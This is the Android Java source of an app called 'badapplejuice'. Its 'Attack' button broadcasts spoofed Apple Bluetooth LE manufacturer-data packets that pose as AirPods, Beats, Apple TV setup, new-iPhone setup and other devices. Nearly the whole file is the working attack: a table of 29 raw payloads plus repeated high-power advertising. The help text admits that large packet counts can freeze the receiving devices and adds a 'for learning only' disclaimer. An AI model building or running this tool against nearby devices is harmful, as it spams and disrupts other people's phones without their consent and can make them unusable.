package cn.sab1e.badapplejuice;

import static android.content.ContentValues.TAG;
import static android.content.pm.PackageManager.PERMISSION_GRANTED;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.annotation.SuppressLint;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.le.AdvertiseCallback;
import android.bluetooth.le.AdvertiseData;
import android.bluetooth.le.AdvertiseSettings;
import android.bluetooth.le.BluetoothLeAdvertiser;
import android.bluetooth.BluetoothManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.icu.util.Calendar;
import android.os.Build;
import android.os.Bundle;
import android.os.ParcelUuid;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;
import android.content.Intent;

import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.UUID;

public class MainActivity extends AppCompatActivity {
    Button btn_Atttack,btn_help;
    TextView tv_advNum;
    Spinner sp_SelectDevice = null;
    private BluetoothLeAdvertiser bluetoothLeAdvertiser;
    private BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
    public byte[][] deviceData = {
            {0x07, 0x19, 0x07, 0x02, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x13, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x14, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x03, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x11, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x10, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x05, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x06, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x09, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x17, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x12, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x07, 0x19, 0x07, 0x16, 0x20, 0x75, (byte)0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x01, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x06, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x20, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x2b, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, (byte)0xc0, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x0d, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x13, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x27, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x0b, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x09, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x02, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
            {0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte)0xc1, 0x1e, 0x60, 0x4c, (byte)0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    };
    private String[] deviceNameArr = {
            "1.AirPods",
            "2.AirPods Pro",
            "3.AirPods Max",
            "4.AirPods",
            "5.AirPods",
            "6.AirPods Pro",
            "7.Powerbeats3",
            "8.Powerbeats Pro",
            "9.Beats Solo Pro",
            "10.Beats Studio Buds",
            "11.Beats Flex",
            "12.BeatsX",
            "13.Beats Solo3",
            "14.Beats Studio3",
            "15.Beats Studio Pro",
            "16.Beats Fit Pro",
            "17.Beats Studio Buds +",
            "18.设置AppleTV",
            "19.无作用",
            "20.配对AppleTV",
            "21.AppleTV 验证AppleID",
            "22.无作用",
            "23.AppleTV 隔空投放和HomeKit",
            "24.AppleTV键盘",
            "25.正在连接AppleTV",
            "26.HomePod",
            "27.设置新iPhone",
            "28.转移手机号码",
            "29.测量TV色彩平衡"
    };
    private int spIndex=0;
    private int advertisingTimes=1;
    // 蓝牙权限列表
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        sp_SelectDevice = findViewById(R.id.sp_SelectDevice);
        Button btn_Attack = findViewById(R.id.btn_Attack);
        Button btn_help = findViewById(R.id.btn_help);
        TextView tv_Debug = findViewById(R.id.tv_Debug);

        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1,deviceNameArr);
        sp_SelectDevice.setAdapter(adapter);
        sp_SelectDevice.setSelection(0);
        //sp_SelectDevice.setOnItemClickListener(this);

        bluetoothLeAdvertiser = bluetoothAdapter.getBluetoothLeAdvertiser();

        btn_help.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                tv_Debug.append("广播包数量：一次发送n个广播包，广播包数量过少会导致较远的设备无法接收到广播包，过多可能会导致设备卡死。\n" +
                        "\n该工具仅用于学习和交流使用，作者不承担用户使用该工具的任何后果，使用该软件表示用户同意此协议。");
            }
        });
        btn_Attack.setOnClickListener(new View.OnClickListener() {
            @SuppressLint("MissingPermission")
            @Override
            public void onClick(View v) {
                tv_Debug.setText("");
                Calendar calendar = Calendar.getInstance();
                int hour = calendar.get(Calendar.HOUR_OF_DAY);
                int minute = calendar.get(Calendar.MINUTE);
                int second = calendar.get(Calendar.SECOND);
                tv_Debug.append("当前时间："+hour+":"+minute+":"+second+"\n");

                Spinner spinner = findViewById(R.id.sp_SelectDevice);
                spIndex = spinner.getSelectedItemPosition();
                EditText editText = findViewById(R.id.et_Times);
                advertisingTimes = Integer.parseInt(editText.getText().toString());


                tv_Debug.append("正在检查蓝牙功能……\n");
                if (bluetoothAdapter == null) {
                    tv_Debug.append("您的设备不支持蓝牙功能！\n");
                    return;
                } else {
                    tv_Debug.append("蓝牙功能正常\n");
                }
                tv_Debug.append("正在检查蓝牙是否已启用……\n");
                //2.检查蓝牙是否已经启用
                if (bluetoothAdapter.isEnabled()) {
                    tv_Debug.append("蓝牙已启用\n");
                    if(bluetoothAdapter.isMultipleAdvertisementSupported()) {
                        tv_Debug.append("当前选中的假设备："+deviceNameArr[spIndex]+"\n");
                        tv_Debug.append("广播包数量："+advertisingTimes+"\n");
                        tv_Debug.append("正在发送广播包……\n");
                        for(int i=0;i<advertisingTimes;i++) {
                            startAdv(getDevice(deviceData, spIndex));
                        }
                    }else{
                        tv_Debug.append("您的设备不支持Advertisement功能！\n");
                    }
                } else {
                    tv_Debug.append("蓝牙已关闭\n请打开蓝牙后重试\n");
                }
            }
        });
    }
    public byte[] getDevice(byte[][] arr,int num){
        byte[] selected = arr[num];
        return selected;
    }
    private boolean bluePermission(){
            if (ContextCompat.checkSelfPermission(this,
                    "android.permission.BLUETOOTH_SCAN")
                    != PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(this,
                    "android.permission.BLUETOOTH_ADVERTISE")
                    != PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(this,
                    "android.permission.BLUETOOTH_ADMIN")
                    != PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(this,
                    "android.permission.BLUETOOTH_CONNECT")
                    != PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(this,
                    "android.permission.BLUETOOTH")
                    != PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(this,
                    "android.permission.ACCESS_COARSE_LOCATION")
                    != PERMISSION_GRANTED
            ){
                ActivityCompat.requestPermissions(this,new String[]{
                        "android.permission.BLUETOOTH_SCAN",
                        "android.permission.BLUETOOTH_ADVERTISE",
                        "android.permission.BLUETOOTH_CONNECT",
                        "android.permission.ACCESS_COARSE_LOCATION",
                        "android.permission.BLUETOOTH",
                        "android.permission.BLUETOOTH_ADMIN"}, 1);
                return false;
            }

        return true;
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1) {
            if (grantResults[0] == PERMISSION_GRANTED) {
            } else {
                Toast.makeText(this, "需要蓝牙权限！", Toast.LENGTH_SHORT).show();
            }
        }
    }

    @SuppressLint("MissingPermission")
    public void startAdv(byte[] data){

        AdvertiseSettings settings = new AdvertiseSettings.Builder()
                .setAdvertiseMode( AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY )
                .setTxPowerLevel( AdvertiseSettings.ADVERTISE_TX_POWER_HIGH )
                .setConnectable( false )
                .build();

        AdvertiseData Data = new AdvertiseData.Builder()
                .setIncludeDeviceName( false)
                .addManufacturerData(0x004c,data)
                .build();
        AdvertiseCallback advertisingCallback = new AdvertiseCallback() {
            @Override
            public void onStartSuccess(AdvertiseSettings settingsInEffect) {
                super.onStartSuccess(settingsInEffect);
            }
            @Override
            public void onStartFailure(int errorCode) {
                Log.e( "BLE", "Advertising onStartFailure: " + errorCode );
                super.onStartFailure(errorCode);
            }
        };
        if (bluePermission()) {
            Log.d("BLE","Send Successful!");
            bluetoothAdapter.setName("AirPods");
            bluetoothLeAdvertiser.startAdvertising(settings, Data, advertisingCallback);
        } else {
            Toast.makeText(this, "ERR01-需要授权才能启动蓝牙", Toast.LENGTH_SHORT).show();
        }
    }

}